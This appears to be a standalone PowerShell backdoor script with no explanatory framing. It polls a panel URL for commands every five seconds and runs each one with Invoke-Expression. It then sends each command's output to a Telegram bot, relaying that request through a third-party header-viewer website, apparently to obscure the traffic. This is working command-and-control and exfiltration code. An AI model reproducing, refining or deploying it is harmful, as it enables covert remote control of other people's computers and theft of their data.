$token = "----------------"
$chat = "----"
$panelUrl = "http://127.0.0.1/web/command.txt"

while ($true) {
    try {
        $command = Invoke-WebRequest -Uri $panelUrl -UseBasicParsing | Select-Object -ExpandProperty Content

        if (-not [string]::IsNullOrWhiteSpace($command)) {
            Write-Host "Executing Command: $command"

            $output = try {
                Invoke-Expression $command
            } catch {
                $_.Exception.Message
            }

            $outputText = "Command: $command`nOutput:`n$output"
            $encodedOutput = [System.Uri]::EscapeDataString($outputText)

            $url = "https://api.telegram.org/bot" + $token + "/sendmessage?chat_id=" + $chat + "&text=" + $encodedOutput

            $mypay = @{
                UrlBox = $url
                AgentBox = "Google Chrome"
                VersionsList = "HTTP/1.1"
                MethodList = "GET"
            }
            Invoke-RestMethod -Uri "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx" -Method POST -Body $mypay
        }
    } catch {
        Write-Host "Error: $($_.Exception.Message)"
    }

    Start-Sleep -Seconds 5
}
